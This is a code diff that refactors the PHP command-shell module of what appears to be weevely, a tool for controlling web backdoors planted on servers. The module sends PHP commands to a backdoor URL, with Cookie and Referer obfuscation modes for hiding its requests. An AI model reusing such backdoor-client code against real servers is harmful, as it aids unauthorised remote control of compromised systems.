@@ -7,48 +7,52 @@ Created on 22/ago/2011
 from core.moduleprobe import ModuleProbe
 from core.moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
 from core.http.cmdrequest import CmdRequest, NoDataException
-from core.parameters import ParametersList, Parameter as P
+from core.savedargparse import SavedArgumentParser as ArgumentParser
+from argparse import SUPPRESS
+from ast import literal_eval
 
-import random, os
-
-classname = 'Php'
-
-
-class Php(Module):
-    '''Shell to execute PHP commands
-
-    Every run should be run_module to avoid recursive
-    interpreter probing
-    '''
-
-    params = ParametersList('PHP command shell', [],
-                             P(arg='cmd', help='PHP command enclosed with brackets and terminated by semi-comma', required=True, pos=0),
-                             P(arg='mode', help='Obfuscation mode', choices = ['Cookie', 'Referer' ]),
-                             P(arg='proxy', help='HTTP proxy'),
-                             P(arg='precmd', help='Insert string at beginning of commands'),
-                             P(arg='debug', help='Enable requests and response debug', type=bool, default=False, hidden=True)
-                        )
+import random, os, shlex, types
 
 
-    def __init__(self, modhandler, url, password):
+WARN_PROXY = 'Proxies can break weevely requests, use proxychains'
+WARN_TRAILING_SEMICOLON = 'command does not have trailing semicolon'
+WARN_NO_RESPONSE = 'No response'
+WARN_UNREACHABLE = 'URL or proxy unreachable'
+WARN_CONN_ERR = 'Error connecting to backdoor URL or proxy'
+WARN_INVALID_RESPONSE = 'skipping invalid response'
+WARN_PHP_INTERPRETER_FAIL = 'PHP and Shell interpreters load failed'
+MSG_PHP_INTERPRETER_SUCCEED = 'PHP and Shell interpreters load succeed'
+WARN_LS_FAIL = 'listing failed, no such file or directory or permission denied'
+WARN_LS_ARGS = 'Error, PHP shell \'ls\' replacement supports only one <path> argument'
 
-        self.cwd_vector = None
-        self.path = None
-        self.proxy = {}
+class Php(ModuleProbe):
+    '''PHP shell'''
 
-        self.modhandler = modhandler
+    mode_choices = ['Cookie', 'Referer' ]
 
-        self.post_data = {}
 
-        self.current_mode = None
+    def _init_module(self):
+        self.stored_args = { 'mode' : None, 'path' : '' }
 
-        self.use_current_path = True
 
-        self.available_modes = self.params.get_parameter_choices('mode')
+    
+    def _set_args(self):
+        self.argparser.add_argument('cmd', help='PHP command enclosed with brackets and terminated by semi-comma', nargs='+' )
+        self.argparser.add_argument('-mode', help='Obfuscation mode', choices = self.mode_choices)
+        self.argparser.add_argument('-proxy', help='HTTP proxy')
+        self.argparser.add_argument('-precmd', help='Insert string at beginning of commands', nargs='+'  )
+        self.argparser.add_argument('-debug', help='Change debug class (3 or less to show request and response)', type=int, default=4, choices =range(1,5))
+        self.argparser.add_argument('-post', help=SUPPRESS, type=literal_eval, default={})
+        self.argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
 
-        mode = self.params.get_parameter_value('mode')
-        if mode:
-            self.modes = [ mode ]
+    def _check_args(self, args):
+        
+        ModuleProbe._check_args(self,args)
+        
+        # Set proxy 
+        if self.args['proxy']:
+            self.mprint(WARN_PROXY)
+            self.args['proxy'] = { 'http' : self.args['proxy'] }
         else:
             self.args['proxy'] = {}        
         
@@ -84,18 +88,11 @@ class Php(Module):
 
 
     def _probe(self):
-
-        for currentmode in self.modes:
-
-            rand = str(random.randint( 11111, 99999 ))
-
-            self.current_mode = currentmode
-            if self.run_module('echo %s;' % (rand)) == rand:
-                self.params.set_and_check_parameters({'mode' : currentmode}, False)
-                break
-
-        if not self.current_mode:
-            raise ModuleException(self.name,  "PHP interpreter initialization failed")
+        
+        
+        # If 'ls', execute __ls_handler
+        if self.args['cmd'][0][:2] == 'ls':
+            self._result = self.__ls_handler(self.args['cmd'][0])
         else:
             self._result = self.__do_request(self.args['cmd'], self.args['mode'])
         
